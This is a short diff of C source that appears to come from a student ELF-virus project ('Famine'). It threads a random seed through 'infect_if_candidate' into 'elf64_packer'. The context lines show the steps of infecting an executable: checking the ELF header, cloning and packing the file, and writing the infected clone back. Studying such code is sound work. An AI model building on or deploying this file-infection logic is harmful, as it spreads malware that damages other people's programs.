@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/11 23:43:31 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/12 18:04:06 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -30,7 +30,7 @@ static bool	elf64_identifier(const Elf64_Ehdr *hdr)
 	return true;
 }
 
-inline bool	infect_if_candidate(const char *file)
+inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
 {
 	struct famine	food;
 	Elf64_Ehdr	elf64_hdr;
@@ -59,7 +59,7 @@ inline bool	infect_if_candidate(const char *file)
 	if (!clone_accessor(&food.clone_safe, food.original_safe.size))
 		return errors(ERR_THROW, '8','6');
 
-	if (!elf64_packer(food, food.original_safe.size))
+	if (!elf64_packer(food, food.original_safe.size, seed))
 		return errors(ERR_THROW, '8','7');
 
 	if (!write_clone_file(food.clone_safe, file))
